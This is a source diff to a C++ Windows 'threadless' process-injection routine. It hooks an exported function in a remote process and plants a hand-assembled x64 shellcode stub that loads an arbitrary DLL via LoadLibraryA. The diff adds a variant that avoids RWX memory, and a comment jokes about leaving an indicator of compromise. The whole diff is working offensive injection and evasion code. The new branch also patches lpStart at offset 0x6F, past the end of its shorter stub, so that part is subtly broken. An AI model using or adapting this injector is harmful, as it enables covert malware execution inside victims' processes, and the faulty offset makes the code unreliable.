@@ -953,6 +953,8 @@ bool HandleCleanup(HANDLE hProcess, std::vector<LPVOID> remoteAddrs, LPVOID loca
 // see github.com/CCob/ThreadlessInject
 LOADER_RET ThreadlessInject(HANDLE hProc, LPVOID lpStart, LPVOID lpParameters, bool debug) {
 
+	bool fancyShmancyNoRWX = false; // change here if RWX avoidance should be done (but then the shellcode fails when the injected process is ACG)
+
     HMODULE hModHook = GetModuleHandleA(g_libThreadlessHook.c_str());
     if (hModHook == NULL) {
         printf("[!] Injector-Threadless: Failed to find %s\n", g_libThreadlessHook.c_str());
@@ -964,6 +966,8 @@ LOADER_RET ThreadlessInject(HANDLE hProc, LPVOID lpStart, LPVOID lpParameters, b
         printf("[!] Injector-Threadless: Did not find the function to hook for threadless injection\n");
         return failed;
     }
+
+    // verify that the function to hook can be made RW-RX
 
     if (debug)
         printf("[+] Injector-Threadless: Found %s!%s at 0x%llx\n", g_libThreadlessHook.c_str(), g_funcThreadlessHook.c_str(), hookedFuncAddr);
@@ -1001,63 +1005,111 @@ LOADER_RET ThreadlessInject(HANDLE hProc, LPVOID lpStart, LPVOID lpParameters, b
         return failed;
     }
 
-    std::vector<byte> shellcodeLoader = {
-        // --- 1. Preserve Registers & store Addrs ---
-        /* 0000 */ 0x51, 0x52, 0x41, 0x50, 0x41, 0x51,                         // push rcx rdx r8 r9               ; in this order
-        /* 0006 */ 0x56,                                                       // push rsi                         ; used for virtProtAddr over multiple calls
-        /* 0007 */ 0x53,                                                       // push rbx                         ; used for hookedFuncAddr over multiple calls
-        /* 0008 */ 0x48, 0xBB, 0x44, 0x44, 0x33, 0x33, 0x33, 0x33, 0x22, 0x22, // movabs rbx, 0x4444333322221111   ; define hookedFuncAddr (patched)
-        /* 0012 */ 0x48, 0xBE, 0x88, 0x88, 0x77, 0x77, 0x66, 0x66, 0x55, 0x55, // movabs rsi, 0x8888777766665555   ; define virtProtAddr   (patched)
+    std::vector<byte> shellcodeLoader = {};
 
-        // --- 2. VirtualProtect to restore original function ---
-        /* 001c */ 0x48, 0x83, 0xEC, 0x28,                                     // sub rsp, 28h                     ; allocate space
-        /* 0020 */ 0x48, 0x8B, 0xCB,                                           // mov rcx, rbx                     ; lpAddress, unprotect hookedFuncAddr
-        /* 0023 */ 0x48, 0xC7, 0xC2, 0x0C, 0x00, 0x00, 0x00,                   // mov rdx, 0xC                     ; dwSize, unprotect 12 bytes
-        /* 002a */ 0x49, 0xC7, 0xC0, 0x40, 0x00, 0x00, 0x00,                   // mov r8, 0x40                     ; flNewProtect, PAGE_EXECUTE_READWRITE
-        /* 0031 */ 0x4C, 0x8D, 0x0C, 0x24,                                     // lea r9, [rsp]                    ; lpflOldProtect, pointer for old value
-        /* 0035 */ 0xFF, 0xD6,                                                 // call rsi                         ; VirtualProtect(hookedFuncAddr, 12, RWX, old)
+    if (fancyShmancyNoRWX) {
+		printf("[$] Injector-Threadless: Using RW->RX approach instead of RWX for the shellcode\n");
 
-        // --- 3. Write Back Original Instructions ---
-        /* 0037 */ 0x48, 0xB8, 0xDD, 0xDD, 0xCC, 0xCC, 0xAA, 0xAA, 0x99, 0x99, // movabs rax, 0xddddccccaaaa9999   ; define originalInstructions_0_8 (patched)
-        /* 0041 */ 0x48, 0x89, 0x03,                                           // mov qword ptr [rbx], rax         ; write to rbx (hookedFuncAddr)
-        /* 0044 */ 0xB8, 0x09, 0x09, 0x09, 0x09,                               // mov eax, 0x09090909              ; define originalInstructions_8_B (patched)
-        /* 0049 */ 0x89, 0x43, 0x08,                                           // mov dword ptr [rbx+8], eax       ; write to rbx+8 (hookedFuncAddr+8)
+        shellcodeLoader = {
+            // --- 1. Preserve Registers & store Addrs ---
+            /* 0000 */ 0x51, 0x52, 0x41, 0x50, 0x41, 0x51,                         // push rcx rdx r8 r9               ; in this order
+            /* 0006 */ 0x56,                                                       // push rsi                         ; used for virtProtAddr over multiple calls
+            /* 0007 */ 0x53,                                                       // push rbx                         ; used for hookedFuncAddr over multiple calls
+            /* 0008 */ 0x48, 0xBB, 0x44, 0x44, 0x33, 0x33, 0x33, 0x33, 0x22, 0x22, // movabs rbx, 0x4444333322221111   ; define hookedFuncAddr (patched)
+            /* 0012 */ 0x48, 0xBE, 0x88, 0x88, 0x77, 0x77, 0x66, 0x66, 0x55, 0x55, // movabs rsi, 0x8888777766665555   ; define virtProtAddr   (patched)
 
-        // --- 4. Re-VirtualProtect ---
-        /* 004c */ 0x48, 0x8B, 0xCB,                                           // mov rcx, rbx                     ; lpAddress, unprotect hookedFuncAddr
-        /* 004f */ 0x48, 0xC7, 0xC2, 0x0C, 0x00, 0x00, 0x00,                   // mov rdx, 0xC                     ; dwSize, unprotect 12 bytes
-        /* 0056 */ 0x49, 0xC7, 0xC0, 0x20, 0x00, 0x00, 0x00,                   // mov r8, 0x20                     ; flNewProtect, PAGE_EXECUTE_READ
-        /* 005d */ 0x4C, 0x8D, 0x0C, 0x24,                                     // lea r9, [rsp]                    ; lpflOldProtect, pointer for old value
-        /* 0061 */ 0xFF, 0xD6,                                                 // call rsi                         ; VirtualProtect(hookedFuncAddr, 12, RX, old)
+            // --- 2. VirtualProtect to restore original function ---
+            /* 001c */ 0x48, 0x83, 0xEC, 0x28,                                     // sub rsp, 28h                     ; allocate space
+            /* 0020 */ 0x48, 0x8B, 0xCB,                                           // mov rcx, rbx                     ; lpAddress, unprotect hookedFuncAddr
+            /* 0023 */ 0x48, 0xC7, 0xC2, 0x0C, 0x00, 0x00, 0x00,                   // mov rdx, 0xC                     ; dwSize, unprotect 12 bytes
+            /* 002a */ 0x49, 0xC7, 0xC0, 0x40, 0x00, 0x00, 0x00,                   // mov r8, 0x40                     ; flNewProtect, PAGE_EXECUTE_READWRITE
+            /* 0031 */ 0x4C, 0x8D, 0x0C, 0x24,                                     // lea r9, [rsp]                    ; lpflOldProtect, pointer for old value
+            /* 0035 */ 0xFF, 0xD6,                                                 // call rsi                         ; VirtualProtect(hookedFuncAddr, 12, RWX, old)
 
-        // --- 5. Call lpStart(lpParameters) ---
-        /* 0063 */ 0x48, 0xB9, 0x2f, 0x6d, 0x6e, 0x74, 0x2f, 0x61, 0x69, 0x6e, // movabs rcx, lpParameters         ; e.g. DLL path (patched)
-        /* 006d */ 0x48, 0xB8, 0x77, 0x61, 0x73, 0x20, 0x68, 0x65, 0x72, 0x65, // movabs rax, lpStart              ; e.g. LoadLibraryA patched)
-        /* 0077 */ 0xFF, 0xD0,                                                 // call rax                         ; e.g. LoadLibraryA(DllPath)
-        /* 0079 */ 0x48, 0x83, 0xC4, 0x28,                                     // add rsp, 28h                     ; un-allocate space
+            // --- 3. Write Back Original Instructions ---
+            /* 0037 */ 0x48, 0xB8, 0xDD, 0xDD, 0xCC, 0xCC, 0xAA, 0xAA, 0x99, 0x99, // movabs rax, 0xddddccccaaaa9999   ; define originalInstructions_0_8 (patched)
+            /* 0041 */ 0x48, 0x89, 0x03,                                           // mov qword ptr [rbx], rax         ; write to rbx (hookedFuncAddr)
+            /* 0044 */ 0xB8, 0x09, 0x09, 0x09, 0x09,                               // mov eax, 0x09090909              ; define originalInstructions_8_B (patched)
+            /* 0049 */ 0x89, 0x43, 0x08,                                           // mov dword ptr [rbx+8], eax       ; write to rbx+8 (hookedFuncAddr+8)
 
-        // --- 6. Epiloge & Jump Back ---
-        /* 007d */ 0x48, 0x89, 0xD8,                                           // mov rax, rbx                     ; rbx still holds final return dest, but rbx must be restored now
-        /* 0080 */ 0x5B, 0x5E,                                                 // pop rbx rsi                      ; restore original rbx and rsi
-        /* 0082 */ 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59,                         // pop r9 r8 rdx rcs                ; in this order
-        /* 0082 */ 0xFF, 0xE0                                                  // jmp rax                          ; jump back to hookedFuncAddr
-    };
+            // --- 4. Re-VirtualProtect ---
+            /* 004c */ 0x48, 0x8B, 0xCB,                                           // mov rcx, rbx                     ; lpAddress, unprotect hookedFuncAddr
+            /* 004f */ 0x48, 0xC7, 0xC2, 0x0C, 0x00, 0x00, 0x00,                   // mov rdx, 0xC                     ; dwSize, unprotect 12 bytes
+            /* 0056 */ 0x49, 0xC7, 0xC0, 0x20, 0x00, 0x00, 0x00,                   // mov r8, 0x20                     ; flNewProtect, PAGE_EXECUTE_READ
+            /* 005d */ 0x4C, 0x8D, 0x0C, 0x24,                                     // lea r9, [rsp]                    ; lpflOldProtect, pointer for old value
+            /* 0061 */ 0xFF, 0xD6,                                                 // call rsi                         ; VirtualProtect(hookedFuncAddr, 12, RX, old)
 
-    // 1. Patch the hooked function address into the shellcode loader stub
-    *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x0A) = hookedFuncAddr;
+            // --- 5. Call lpStart(lpParameters) ---
+            /* 0063 */ 0x48, 0xB9, 0x2f, 0x6d, 0x6e, 0x74, 0x2f, 0x61, 0x69, 0x6e, // movabs rcx, lpParameters         ; define DLL path (patched)
+            /* 006d */ 0x48, 0xB8, 0x77, 0x61, 0x73, 0x20, 0x68, 0x65, 0x72, 0x65, // movabs rax, lpStart              ; define LoadLibraryA patched)
+            /* 0077 */ 0xFF, 0xD0,                                                 // call rax                         ; LoadLibraryA(DllPath)
+            /* 0079 */ 0x48, 0x83, 0xC4, 0x28,                                     // add rsp, 28h                     ; un-allocate space
 
-    // 2. Patch the VirtualProtect address into the shellcode loader stub
-    *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x14) = virtProtAddr;
+            // --- 6. Epiloge & Jump Back ---
+            /* 007d */ 0x48, 0x89, 0xD8,                                           // mov rax, rbx                     ; rbx still holds final return dest, but rbx must be restored now
+            /* 0080 */ 0x5B, 0x5E,                                                 // pop rbx rsi                      ; restore original rbx and rsi
+            /* 0082 */ 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59,                         // pop r9 r8 rdx rcs                ; in this order
+            /* 0082 */ 0xFF, 0xE0                                                  // jmp rax                          ; jump back to hookedFuncAddr
+        };
 
-    // 3. Patch the 12 bytes that were in the original export prior to hooking
-    *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x39) = originalInstructions_0_8;
-    *reinterpret_cast<UINT*>(shellcodeLoader.data() + 0x45) = originalInstructions_8_B;
+        // 1. Patch the hooked function address into the shellcode loader stub
+        *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x0A) = hookedFuncAddr;
 
-    // 4. Patch lpParameters into RCX
-    *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x65) = (DWORD64)lpParameters;
+        // 2. Patch the VirtualProtect address into the shellcode loader stub
+        *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x14) = virtProtAddr;
 
-    // 5. Patch lpStart into RAX
-    *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x6F) = (DWORD64)lpStart;
+        // 3. Patch the 12 bytes that were in the original export prior to hooking
+        *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x39) = originalInstructions_0_8;
+        *reinterpret_cast<UINT*>(shellcodeLoader.data() + 0x45) = originalInstructions_8_B;
+
+        // 4. Patch lpParameters into RCX
+        *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x65) = (DWORD64)lpParameters;
+
+        // 5. Patch lpStart into RAX
+        *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x6F) = (DWORD64)lpStart;
+    
+    }
+
+    else {
+        shellcodeLoader = {
+            // --- 1. Preserve Registers & store Addrs ---
+            /* 0000 */ 0x51, 0x52, 0x41, 0x50, 0x41, 0x51,                         // push rcx rdx r8 r9               ; in this order
+            /* 0006 */ 0x53,                                                       // push rbx                         ; used for hookedFuncAddr over multiple calls
+            /* 0007 */ 0x48, 0xBB, 0x44, 0x44, 0x33, 0x33, 0x33, 0x33, 0x22, 0x22, // movabs rbx, 0x4444333322221111   ; define hookedFuncAddr (patched)
+
+            // --- 3. Write Back Original Instructions ---
+            /* 0011 */ 0x48, 0xB8, 0xDD, 0xDD, 0xCC, 0xCC, 0xAA, 0xAA, 0x99, 0x99, // movabs rax, 0xddddccccaaaa9999   ; define originalInstructions_0_8 (patched)
+            /* 001B */ 0x48, 0x89, 0x03,                                           // mov qword ptr [rbx], rax         ; write to rbx (hookedFuncAddr)
+            /* 001E */ 0xB8, 0x09, 0x09, 0x09, 0x09,                               // mov eax, 0x09090909              ; define originalInstructions_8_B (patched)
+            /* 0023 */ 0x89, 0x43, 0x08,                                           // mov dword ptr [rbx+8], eax       ; write to rbx+8 (hookedFuncAddr+8)
+
+            // --- 5. Call lpStart(lpParameters) ---
+            /* 0026 */ 0x48, 0x83, 0xEC, 0x28,                                     // sub rsp, 28h                     ; allocate space
+            /* 002A */ 0x48, 0xB9, 0x2f, 0x6d, 0x6e, 0x74, 0x2f, 0x61, 0x69, 0x6e, // movabs rcx, lpParameters         ; define DLL path (patched)
+            /* 0034 */ 0x48, 0xB8, 0x77, 0x61, 0x73, 0x20, 0x68, 0x65, 0x72, 0x65, // movabs rax, lpStart              ; define LoadLibraryA patched)
+            /* 003E */ 0xFF, 0xD0,                                                 // call rax                         ; LoadLibraryA(DllPath)
+            /* 0040 */ 0x48, 0x83, 0xC4, 0x28,                                     // add rsp, 28h                     ; un-allocate space
+
+            // --- 6. Epiloge & Jump Back ---
+            /* 0044 */ 0x48, 0x89, 0xD8,                                           // mov rax, rbx                     ; rbx still holds final return dest, but rbx must be restored now
+            /* 0047 */ 0x5B,                                                       // pop rbx                          ; restore original rbx
+            /* 0048 */ 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59,                         // pop r9 r8 rdx rcs                ; in this order
+            /* 004E */ 0xFF, 0xE0                                                  // jmp rax                          ; jump back to hookedFuncAddr
+        };
+
+        // 1. Patch the hooked function address into the shellcode loader stub
+        *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x09) = hookedFuncAddr;
+
+        // 3. Patch the 12 bytes that were in the original export prior to hooking
+        *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x13) = originalInstructions_0_8;
+        *reinterpret_cast<UINT*>(shellcodeLoader.data() + 0x1F) = originalInstructions_8_B;
+
+        // 4. Patch lpParameters into RCX
+        *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x2C) = (DWORD64)lpParameters;
+
+        // 5. Patch lpStart into RAX
+        *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x6F) = (DWORD64)lpStart;
+    }
 
     if (debug)
         printf("[+] Injector-Threadless: Patched and prepared the threadless loader locally\n");
@@ -1134,21 +1186,27 @@ LOADER_RET ThreadlessInject(HANDLE hProc, LPVOID lpStart, LPVOID lpParameters, b
 
     // write the actual hook to execute the loader on next hooked function invokation
     DWORD oldHookProtect = NULL;
+	DWORD tempHookProtect = NULL;
     if (!VirtualProtectEx(hProc, (LPVOID)hookedFuncAddr, hook.size(), PAGE_EXECUTE_READWRITE, &oldHookProtect)) {
         printf("[!] Injector-Threadless: Failed to RWX protect the hook at 0x%llx in remote process, error %i\n", hookedFuncAddr, GetLastError());
-        if (foundCodeCave) { revertCodeCave(cc); } else { HandleCleanup(hProc, { loaderAddr }, {}); }
+        if (foundCodeCave) { revertCodeCave(cc); }
+        else { HandleCleanup(hProc, { loaderAddr }, {}); }
         return failed;
     }
     if (!WriteProcessMemory(hProc, (LPVOID)hookedFuncAddr, hook.data(), hook.size(), NULL)) {
         printf("[!] Injector-Threadless: Failed to write the hook to remote process at 0x%llx, error %i\n", hookedFuncAddr, GetLastError());
-        if (foundCodeCave) { revertCodeCave(cc); } else { HandleCleanup(hProc, { loaderAddr }, {}); }
+        if (foundCodeCave) { revertCodeCave(cc); }
+        else { HandleCleanup(hProc, { loaderAddr }, {}); }
         return failed;
     }
-    if (!VirtualProtectEx(hProc, (LPVOID)hookedFuncAddr, hook.size(), PAGE_EXECUTE_READ, &oldHookProtect)) {
-        printf("[!] Injector-Threadless: Failed to RX protect the hook at 0x%llx in remote process (proc will crash on next access, gl hf), error %i\n", hookedFuncAddr, GetLastError());
-        // I would not touch anything here, hopes and prayers that the remote process does not crash now
-        if (foundCodeCave) { revertCodeCave(cc); } else { HandleCleanup(hProc, { loaderAddr }, {}); }
-        return failed;
+    if (fancyShmancyNoRWX) {
+        if (!VirtualProtectEx(hProc, (LPVOID)hookedFuncAddr, hook.size(), oldHookProtect, &tempHookProtect)) {
+            printf("[!] Injector-Threadless: Failed to RX protect the hook at 0x%llx in remote process (proc will crash on next access, gl hf), error %i\n", hookedFuncAddr, GetLastError());
+            // I would not touch anything here, hopes and prayers that the remote process does not crash now
+            if (foundCodeCave) { revertCodeCave(cc); }
+            else { HandleCleanup(hProc, { loaderAddr }, {}); }
+            return failed;
+        }
     }
 
     // verify
@@ -1180,7 +1238,6 @@ LOADER_RET ThreadlessInject(HANDLE hProc, LPVOID lpStart, LPVOID lpParameters, b
             printf("[:] Injector-Threadless: Still waiting for execution of Threadless loader after %i seconds\n", secondsPassed);
         }
 
-
         // read back the hooked function to check for execution start
         std::vector<byte> originalVerify(hook.size());
         if (!ReadProcessMemory(hProc, (LPVOID)hookedFuncAddr, originalVerify.data(), hook.size(), NULL)) {
@@ -1205,6 +1262,13 @@ LOADER_RET ThreadlessInject(HANDLE hProc, LPVOID lpStart, LPVOID lpParameters, b
             }
             else {
                 HandleCleanup(hProc, { loaderAddr }, NULL);
+            }
+            if (!fancyShmancyNoRWX) {
+				// restore the original protection of the hook now (instead of the loader doing it, since it is not RWX)
+				if (!VirtualProtectEx(hProc, (LPVOID)hookedFuncAddr, hook.size(), oldHookProtect, &tempHookProtect)) {
+					printf("[-] Injector-Threadless: Failed to restore original protection of the hook at 0x%llx in remote process, error %i\n", hookedFuncAddr, GetLastError());
+					return successful; // still executed, just left an IOC on the original process ;)
+				}
             }
             return successful;
         }
